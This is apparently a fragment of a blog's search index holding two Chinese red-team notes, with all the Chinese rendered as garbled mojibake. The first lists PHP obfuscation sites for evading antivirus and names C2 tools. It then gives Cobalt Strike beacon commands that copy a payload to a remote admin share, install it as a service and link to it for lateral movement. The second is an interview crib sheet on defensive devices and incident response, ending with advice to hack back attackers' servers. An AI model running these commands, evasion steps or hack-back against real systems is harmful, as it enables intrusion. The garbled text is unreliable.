 <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">PHPä»£ç åœ¨çº¿æ··æ·†&amp;åŠ å¯†ï¼šhttps://www.toolfk.com/zh-CN/tools/convert-php.htmlã€https://murk.xiaojieapi.com/#ã€https://uutool.cn/php/</span><br></pre></td></tr></table></figure>
</li>
<li><p>è¡Œä¸ºå…æ€</p>
</li>
</ol>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h2 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h2><h1 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h1><h2 id="C2"><a href="#C2" class="headerlink" title="C2"></a>C2</h2><h3 id="Vshell"><a href="#Vshell" class="headerlink" title="Vshell"></a>Vshell</h3><p>å›½äº§è‡ªç ”C2å·¥å…·ï¼Œå®¢æˆ·ç«¯ä¸ºWEBå½¢å¼ï¼Œåœ¨é—²é±¼ä¸Šä¹°</p>
<h3 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h3><p>è€ç‰Œå·¥å…·ï¼Œç‰¹å¾è¾ƒå¤šï¼Œéœ€è¦é­”æ”¹ï¼ŒLinuxå…¼å®¹è¾ƒå°‘</p>
<h2 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h2><h3 id="SMB-CS"><a href="#SMB-CS" class="headerlink" title="SMB-CS"></a>SMB-CS</h3><ol>
<li><p>æ–°å¢ä¸€ä¸ªç”¨æˆ·æ¥æ”¶SMBé€šä¿¡ç›‘å¬å™¨</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010210705756.png" alt="image-20251010210705756"></p>
</li>
<li><p>ç”Ÿæˆä¸€ä¸ªåŸºäºSMBé€šä¿¡çš„beacon</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010210749738.png" alt="image-20251010210749738"></p>
</li>
<li><p>é€šè¿‡è‚‰é¸¡å°†beaconä¸Šä¼ åˆ°é¶æ ‡ä¸Šï¼Œå¹¶ä¸”è§¦å‘æ‰§è¡Œ &amp;&amp; æ“æ§è‚‰é¸¡ä¸»åŠ¨è¿æ¥smb-beaconï¼Œå®Œæˆé“¾è·¯æ­å»º</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010211001369.png" alt="image-20251010211001369"></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell copy smb_update.exe \\owa.god.org\c$</span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell sc \\owa.god.org create SMBupdate binpath= <span class="string">&quot;cmd.exe /c c:\smb_update.exe&quot;</span></span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell sc \\owa.god.org start SMBupdate</span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash"><span class="built_in">link</span> owa.god.org</span></span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010211458999.png" alt="image-20251010211458999"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>çº¢é˜Ÿ</category>
      </categories>
      <tags>
        <tag>APT</tag>
        <tag>çº¢é˜Ÿ</tag>
        <tag>æ¸—é€</tag>
        <tag>web</tag>
        <tag>å†…ç½‘</tag>
      </tags>
  </entry>
  <entry>
    <title>çº¢é˜Ÿé¢è¯•</title>
    <url>/%E5%85%AB%E8%82%A1%E6%96%87.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h2><ol>
<li><p>å¸¸è§å®‰å…¨è®¾å¤‡ä¹‹é—´çš„åŒºåˆ«</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">WAFï¼šä¸“é—¨å¯¹WEBè¿›è¡Œé˜²æŠ¤çš„åº”ç”¨ç¨‹åºï¼Œå¯¹httpæµé‡è¿›è¡Œç‰¹å¾æ£€æµ‹ï¼Œå¹¶åŠæ—¶æ‹¦æˆªã€å°ç¦IPç­‰æªæ–½ï¼›</span><br><span class="line">é˜²ç«å¢™ï¼šä¸»è¦åœ¨ä¸‰å±‚ã€å››å±‚è¿›è¡Œè¿‡æ»¤ï¼Œæ ¹æ®è§„åˆ™è¿›è¡Œæ‹¦æˆªæˆ–è€…æ”¾è¡Œï¼›</span><br><span class="line">IDS: å¯¹äº¤æ¢æœºé•œåƒè¿‡æ¥çš„æµé‡è¿›è¡Œæ£€æµ‹ï¼Œæ ¹æ®ç‰¹å¾è¿›è¡ŒåŒ¹é…ç„¶åå‘Šè­¦ï¼Œä¸€èˆ¬æ—è·¯éƒ¨ç½²ï¼›</span><br><span class="line">IPSï¼šåœ¨æ£€æµ‹æµé‡çš„åŸºç¡€ä¹‹ä¸Šï¼Œè¿˜å¯ä»¥æ‹¦æˆªå±é™©çš„æµé‡ï¼Œä¸»è¦éƒ¨ç½²åœ¨å‡ºå…¥å£çš„ä¸€äº›åœ°æ–¹ï¼Œå½¢æˆä¸€æ¡ä¸²è¡Œé“¾è·¯ï¼›</span><br><span class="line">æ€åŠ¿æ„ŸçŸ¥ï¼šæ•´ä¸ªç½‘ç»œè¿›è¡Œçš„ç›‘æ§ï¼Œå®æ—¶æ±‡æŠ¥æ”»å‡»æºã€æ”»å‡»äº‹ä»¶ï¼Œç”šè‡³è¿˜å¯ä»¥é¢„æµ‹æç¤ºä¸‹ä¸€æ­¥çš„æ”»å‡»æ–¹å‘ï¼Œæå‰é˜²å¾¡ï¼›</span><br><span class="line">èœœç½ï¼šæ•…æ„éƒ¨ç½²çš„å¸¦æœ‰æ¼æ´çš„ä¸€äº›ç³»ç»Ÿï¼Œä¸»è¦å¥—å–æ”»å‡»è€…çš„ä¸€äº›æ”»å‡»æ‰‹æ³•ã€å·¥å…·ç­‰ç­‰ï¼Œå½“ç„¶äº†ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šèµ·åˆ°äº†é˜²å¾¡ä½œç”¨ï¼›æ ¹æ®äº¤äº’å¼ç¨‹åº¦ä¸€èˆ¬åˆ†ä¸ºä½ä¸­é«˜ä¸‰ç§èœœç½ï¼Œæœ€å¸¸ç”¨çš„å¼€æºèœœç½ä¸€èˆ¬æ˜¯hfishingï¼›</span><br><span class="line">å¨èƒæƒ…æŠ¥ï¼šå¯¹æ”»å‡»äº‹ä»¶è¿›è¡Œçš„æ€»ç»“ï¼Œå½¢æˆçš„æŠ¥å‘Šï¼Œæœ€æœ‰æ„ä¹‰/æœ€å…·æœ‰ä»£è¡¨æ€§çš„è¦çœ‹é‡Œé¢çš„IOCï¼ˆæ”»å‡»çš„ç‰¹å¾ï¼‰ã€‚æ¥æºï¼šå¾®æ­¥åœ¨çº¿ã€XXXå¨èƒæƒ…æŠ¥ä¸­å¿ƒï¼Œåœ¨äº‘æ²™ç®±é‡Œé¢è¿è¡Œå¯ä»¥ç¨‹åºï¼Œæ ¹æ®ç‰¹å¾/IOCè¿›è¡Œåˆ†æï¼›</span><br><span class="line">EDRï¼šæ ¹æ®ç‰¹å¾åº“ã€è¡Œä¸ºå¯¹ç»ˆç«¯è¿›è¡Œç›‘æ§ã€é˜²æŠ¤ã€é«˜å±è¡Œä¸ºçš„ç»„ç»‡ã€‚</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ€ä¹ˆåˆ¤æ–­è®¾å¤‡æ˜¯ä¸æ˜¯è¯¯æŠ¥</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. çœ‹æ¥æºIPï¼šå›½å†…çš„/å›½å¤–çš„ã€å†…éƒ¨æ¥æº/å¤–éƒ¨æ¥æºã€è®¿é—®é¢‘ç‡ã€æœ‰æ²¡æœ‰å…¶ä»–æ”»å‡»è¡Œä¸ºçš„è®°å½•ï¼ˆå®‰å…¨è®¾å¤‡&amp;å¨èƒæƒ…æŠ¥ï¼‰ï¼›</span><br><span class="line">2. äººå·¥åˆ†ææµé‡ç‰¹å¾ï¼šè¯·æ±‚é‡Œé¢æœ‰æ²¡æœ‰ä¸€äº›æ¯”è¾ƒæ•æ„Ÿçš„æµé‡ç‰¹å¾/æ•æ„Ÿçš„å‡½æ•°åå…³é”®å­—ã€å“åº”å†…å®¹æ˜¯ä¸æ˜¯åŒ…å«äº†æ•æ„Ÿä¿¡æ¯/å‘½ä»¤æ‰§è¡Œçš„ç»“æœ</span><br></pre></td></tr></table></figure>
</li>
<li><p>windowså…¥ä¾µæ’æŸ¥</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. æ¶æ„è´¦å·ï¼šnet user/net localgroup/æ³¨å†Œè¡¨æ‰¾å½±å­è´¦æˆ·/åœ¨äº‹ä»¶ç®¡ç†å™¨çš„widnowså®‰å…¨æ—¥å¿—ä¸­ï¼Œæ‰¾å‡ºç™»å½•çš„ç”¨æˆ·ï¼›</span><br><span class="line">2. netstat -anoè·å–å¤–éƒ¨é“¾æ¥ipï¼Œç„¶ååˆ°å¨èƒæƒ…æŠ¥ä¸­å¿ƒè¿›è¡Œåˆ¤æ–­</span><br><span class="line">3. å¯åŠ¨é¡¹æ’æŸ¥ã€è®¡åˆ’ä»»åŠ¡</span><br><span class="line">4. everythingæŸ¥çœ‹æ–°å¢çš„ä¸€äº›æ–‡ä»¶ï¼Œé‡ç‚¹ç­›é€‰exe/vbs/dllï¼Œé€šè¿‡äº‘æ²™ç®±è¿›è¡Œåœ¨çº¿åˆ¤æ–­</span><br><span class="line">5. æ—¥å¿—åˆ†æ4625æ‰¾å¤±è´¥çš„æ—¥å¿—ã€4672ç®¡ç†å‘˜ç™»å½•ã€4688æ‰¾æ–°åˆ›å»ºçš„æ—¥å¿—</span><br></pre></td></tr></table></figure>
</li>
<li><p>Linuxå…¥ä¾µæ’æŸ¥</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. è´¦å·å®‰å…¨ï¼šåˆ—å‡ºæ‰€æœ‰ç‰¹æƒç”¨æˆ·ã€sudoç”¨æˆ·ã€è¿œç¨‹ç™»å½•ç”¨æˆ·ï¼›å†å²å‘½ä»¤ï¼Œå¯ä»¥åœ¨/etc/profileæ–‡ä»¶ä¸­é…ç½®è®°å½•å‘½ä»¤æ—¶ï¼ŒåŒæ—¶è®°å½•IPåœ°å€</span><br><span class="line">2. ss -tulpnaæ‰¾å‡ºæ‰€æœ‰ç½‘ç»œè¿æ¥å’Œå¯¹åº”çš„è¿›ç¨‹</span><br><span class="line">3. å¯åŠ¨é¡¹æ’æŸ¥ï¼ˆ/etc/rc.d/rc*.d/ï¼‰ã€å®šæ—¶ä»»åŠ¡ï¼ˆ/var/spool/cron/ /etc/crontabï¼‰</span><br></pre></td></tr></table></figure>
</li>
<li><p>æº¯æºååˆ¶</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. ç¡®è®¤æ”»å‡»äº‹ä»¶ä¹‹åï¼Œé€šè¿‡ç³»ç»Ÿæ—¥å¿—ã€ç½‘ç»œæµé‡å®šä½åˆ°æ”»å‡»è€…ipï¼›</span><br><span class="line">2. é€šè¿‡ä¸€äº›åœ¨çº¿ç½‘ç«™ip138ã€ç«™é•¿ä¹‹å®¶åæŸ¥åŸŸåï¼Œå°½é‡æ‰¾åˆ°æ”»å‡»è€…çš„ä¸ªäººä¿¡æ¯ï¼›</span><br><span class="line">3. åæ‰“æ”»å‡»è€…ipï¼Œæ‰¾åˆ°vpsä¸Šé—ç•™çš„ä¸ªäººæ•°æ®ï¼ŒæŸ¥çœ‹ç™»å½•æ—¥å¿—ï¼Œæ‰¾å‡ºä¸Šä¸€æ¬¡çš„ç™»å½•ipï¼›</span><br><span class="line">4. éƒ¨ç½²èœœç½ï¼Œå¥—å–æ”»å‡»è€…çš„å·¥å…·ä¿¡æ¯ã€å­—å…¸ä¿¡æ¯ã€æ”»å‡»çš„ç›®æ ‡ç­‰æ”»å‡»æ‰‹æ³•</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>çº¢é˜Ÿ</category>
      </categories>
      <tags>
        <tag>é¢è¯•</tag>
        <tag>å…«è‚¡æ–‡</tag>
        <tag>é¢ç»</tag>
      </tags>
  </entry>
</search>
